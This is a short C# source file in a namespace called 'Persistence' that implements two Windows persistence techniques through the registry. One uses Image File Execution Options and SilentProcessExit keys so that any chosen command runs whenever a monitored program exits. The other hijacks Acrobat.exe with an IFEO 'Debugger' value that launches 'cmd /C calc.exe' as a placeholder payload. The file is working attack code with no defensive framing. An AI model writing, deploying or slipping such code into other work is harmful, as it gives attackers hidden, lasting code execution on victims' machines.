using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Persistence
{
    internal class Persistence
    {
        private RegistryKey registryKey = Registry.LocalMachine;

        /// <summary>
        /// Interception of the closure of a certain program and execution of commands at this event
        /// Privileges: Admin
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void GFlags(string programName, string commandToExecute)
        {
            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                                      true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("GlobalFlag", "512", RegistryValueKind.DWord);
            subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{programName}",
                                                    true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("ReportingMode", "1", RegistryValueKind.DWord);
            subkey.SetValue("MonitorProcess", commandToExecute);

            // subkey.SetValue("MonitorProcess", "");
        }

        /// <summary>
        /// 
        /// </summary>
        public void ReplaceProgram()
        {
            // Maybe I should do copy of program and execute it with my program using &

            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Acrobat.exe",
                                          true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("Debugger", "cmd /C calc.exe", RegistryValueKind.String);

            // subkey.DeleteValue("Debugger");
        }
    }
}
